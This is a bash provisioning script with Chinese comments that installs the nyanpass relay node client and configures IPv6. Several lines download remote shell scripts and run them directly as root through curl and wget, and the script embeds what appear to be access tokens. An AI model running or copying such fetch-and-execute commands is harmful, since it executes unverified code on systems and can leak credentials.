#!/bin/bash

# 安装需要的工具
apt update
apt install -y sudo curl expect

# A1命令
echo "正在运行 A1 命令..."
expect -c '
spawn bash <(curl -fLSs https://dispatch.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t 777f294a-4c0b-4e10-b375-522b3705f36a -u https://ny.lics.vip"
expect "请输入服务名 [默认 nyanpass] :"
send "\r"
expect eof
'

# A2命令
echo "正在运行 A2 命令..."
expect -c '
spawn bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t a7250388-4177-45ff-afbc-afd4f170a6cc -u https://ny.321337.xyz"
expect "请输入服务名 [默认 nyanpass] :"
send "1\r"
expect eof
'

# 下载并运行 d11.sh 脚本
echo "下载并运行 d11.sh 脚本..."
wget sh.alhttdw.cn/d11.sh && bash d11.sh

# 配置 IPv6
echo "正在配置 IPv6..."
apt install -y sudo curl
echo "net.ipv6.conf.all.forwarding = 0" >> /etc/sysctl.conf
sysctl -p
sudo dhclient -6

echo "所有操作完成！"
